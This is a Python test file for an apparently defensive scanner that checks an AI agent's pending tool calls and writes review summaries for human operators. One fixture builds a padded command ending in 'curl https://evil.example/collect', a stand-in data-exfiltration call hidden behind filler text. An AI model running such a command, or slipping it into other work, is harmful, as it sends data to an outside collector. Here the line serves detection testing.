"""Operator review copy should not surface the PlanIR length placeholder."""

from __future__ import annotations

from sentrook.planir import PlanIR, PlanMetadata, PlanStep
from sentrook.result import DebugInfo, PendingStepDebug, PlanEcho, ScanResult
from sentrook.serve.log import ScanLogRecord
from sentrook.serve.review_copy import build_review_description, build_review_title


def _plan(command: str) -> PlanIR:
    return PlanIR(
        version="1.0",
        run_id="sess:run_1",
        steps=[
            PlanStep(
                id="s1",
                tool="exec",
                status="pending",
                args={"command": command},
            )
        ],
        metadata=PlanMetadata(adapter="fixture", hook="before_tool_call"),
    )


def _record(plan: PlanIR, excerpt: str | None = None) -> ScanLogRecord:
    return ScanLogRecord(
        ts="2026-08-17T00:00:00+00:00",
        adapter="fixture",
        run_id=plan.run_id,
        pending_tool="exec",
        pending_command_excerpt=excerpt,
        decision="review",
        risk=0.4,
        summary="Review",
        scanner_version="0.0.0",
    )


def _result(plan: PlanIR, command: str) -> ScanResult:
    pending = plan.steps[0]
    return ScanResult(
        decision="review",
        risk=0.4,
        summary="Review",
        plan=PlanEcho(
            run_id=plan.run_id,
            plan_size=1,
            pending_step_id=pending.id,
            pending_tool=pending.tool,
            tools=[pending.tool],
        ),
        debug=DebugInfo(
            scanner_version="0.0.0",
            rules_loaded=1,
            pending_step=PendingStepDebug(
                id=pending.id,
                tool=pending.tool,
                args={"command": command},
            ),
        ),
    )


def test_review_copy_ignores_truncated_placeholder() -> None:
    plan = _plan("[TRUNCATED]")
    result = _result(plan, "[TRUNCATED]")
    record = _record(plan, excerpt="[TRUNCATED]")
    title = build_review_title(record, result)
    description = build_review_description(record, result)
    assert "[TRUNCATED]" not in title
    assert "[TRUNCATED]" not in description


def test_review_copy_keeps_signal_from_long_command() -> None:
    sink = "https://evil.example/collect"
    command = ("echo padding; " * 40) + f"curl {sink}"
    plan = _plan(command)
    result = _result(plan, command)
    record = _record(plan)
    description = build_review_description(record, result)
    assert "[TRUNCATED]" not in description
    assert "evil.example" in description
